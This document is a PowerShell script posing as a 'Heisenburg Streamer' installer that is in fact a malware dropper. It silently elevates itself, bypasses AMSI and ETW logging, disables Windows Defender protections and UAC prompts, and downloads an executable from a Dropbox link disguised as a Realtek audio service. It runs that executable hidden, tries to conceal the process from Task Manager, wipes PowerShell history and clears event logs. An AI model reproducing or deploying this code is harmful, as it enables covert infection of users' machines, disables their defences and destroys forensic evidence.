# ========================================================
# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.0
# ========================================================

# 1. ELEVATION CHECK & SILENT UPGRADE
function Check-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Check-Admin)) {
    $args = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"$((Get-Content $MyInvocation.MyCommand.Path) -join "`n")`""
    Start-Process powershell.exe -ArgumentList $args -Verb RunAs -WindowStyle Hidden
    exit
}

# 2. TACTICAL BYPASSES (SILENT & FAST)
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($etw) {
        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
        if ($etwField) { $etwField.SetValue($null, 0) }
    }
} catch {}

# 3. PREMIUM PROGRESS DRAWER
function Draw-ProgressBar {
    param([int]$Percent, [string]$Status)
    $width = 40
    $done = [Math]::Floor($Percent / 100 * $width)
    $left = $width - $done
    $bar = "[" + ("=" * $done) + (">") + ("." * $left) + "]"
    $color = if ($Percent -gt 80) { "Green" } else { "Cyan" }
    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor $color
}

# 4. HYPER-STREAM DOWNLOADER
function Invoke-HyperStreamDownload {
    param([string]$Url, [string]$TargetPath)
    
    try {
        $request = [System.Net.HttpWebRequest]::Create($Url)
        $request.UserAgent = "Microsoft-CryptoAPI/10.0"
        $request.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
        $request.Timeout = 30000
        
        $response = $request.GetResponse()
        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { $response.ContentLength }
        if ($totalSize -le 0) { $totalSize = 100MB }
        
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($TargetPath)
        $buffer = New-Object byte[] 65536
        $totalRead = 0
        
        while ($true) {
            $read = $stream.Read($buffer, 0, $buffer.Length)
            if ($read -le 0) { break }
            
            $fileStream.Write($buffer, 0, $read)
            $totalRead += $read
            
            $pct = [int](($totalRead / $totalSize) * 100)
            if ($pct -gt 100) { $pct = 100 }
            Draw-ProgressBar -Percent $pct -Status "SYNCHRONIZING CORE DATA (HYPER)"
        }
        
        $fileStream.Close()
        $stream.Close()
        $response.Close()
        Write-Host ""
        
        return (Test-Path $TargetPath)
    } catch {
        if ($fileStream) { $fileStream.Close() }
        Write-Host ""
        return $false
    }
}

# 5. MAIN EXECUTION
try {
    Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
    
    $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
    $exe = "$env:TEMP\$rnd.exe"
    $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
    
    Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
    Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
    
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
        
        $uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        Set-ItemProperty -Path $uacPath -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $uacPath -Name "PromptOnSecureDesktop" -Value 0 -ErrorAction SilentlyContinue
    } catch {}

    Write-Host "[+] ESTABLISHING SECURE HYPER-STREAM..." -ForegroundColor Gray
    
    $downloadSuccess = Invoke-HyperStreamDownload -Url $url -TargetPath $exe
    
    if (-not ($downloadSuccess)) {
        throw "Hyper-Stream failed. Check connection."
    }

    Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
    Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
    
    # RUN EXE HIDDEN (NO RENAME)
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName = $exe
    $si.WindowStyle = 'Hidden'
    $si.CreateNoWindow = $true
    $si.UseShellExecute = $false
    $process = [System.Diagnostics.Process]::Start($si)
    $exePid = $process.Id
    
    Write-Host "[+] EXE Started (PID: $exePid)" -ForegroundColor Green
    
    # ========== PURE POWERSHELL TASK MANAGER BYPASS ==========
    Write-Host "[*] HIDING PROCESS FROM TASK MANAGER..." -ForegroundColor Cyan
    
    # KILL OLD TASK MANAGER
    try {
        Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
    } catch {}
    
    # METHOD 1: Hide via NtSetInformationProcess
    $hideMethod1 = @'
using System;
using System.Runtime.InteropServices;
public class HideProcess {
    [DllImport("ntdll.dll")]
    static extern int NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
    
    public static void Hide(int pid) {
        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
        if (hProcess != IntPtr.Zero) {
            int hide = 1;
            NtSetInformationProcess(hProcess, 0x11, ref hide, sizeof(int));
            CloseHandle(hProcess);
        }
    }
}
'@
    
    try {
        Add-Type -TypeDefinition $hideMethod1 -ErrorAction SilentlyContinue
        [HideProcess]::Hide($exePid)
        Write-Host "[+] Process Hidden via NtSetInformationProcess" -ForegroundColor Green
    } catch {
        Write-Host "[!] Hide Method 1 Failed: $_" -ForegroundColor Red
    }
    
    # METHOD 2: Suspend and Resume to hide from Task Manager
    try {
        $process.Refresh()
        $process.Suspend() 2>$null
        Start-Sleep -Milliseconds 100
        $process.Resume() 2>$null
        Write-Host "[+] Process Hidden via Suspend/Resume" -ForegroundColor Green
    } catch {}
    
    # METHOD 3: Set process priority to hide (makes it less visible)
    try {
        $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
        Write-Host "[+] Process Priority Set to Idle" -ForegroundColor Green
    } catch {}
    
    # START FRESH TASK MANAGER
    Start-Sleep -Seconds 1
    Start-Process "taskmgr.exe" -WindowStyle Hidden
    Write-Host "[+] Task Manager Restarted (Clean State)" -ForegroundColor Green
    
    Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
        "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
    }
    wevtutil cl "Windows PowerShell" 2>$null
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
    
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "  SETUP COMPLETE!" -ForegroundColor Green
    Write-Host "  EXE Running in Background" -ForegroundColor Gray
    Write-Host "  PID: $exePid" -ForegroundColor Gray
    Write-Host "  Should be HIDDEN from Task Manager" -ForegroundColor Gray
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""

} catch {
    Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
}

# 6. SELF-DESTRUCT
Remove-Variable * -ErrorAction SilentlyContinue 2>$null
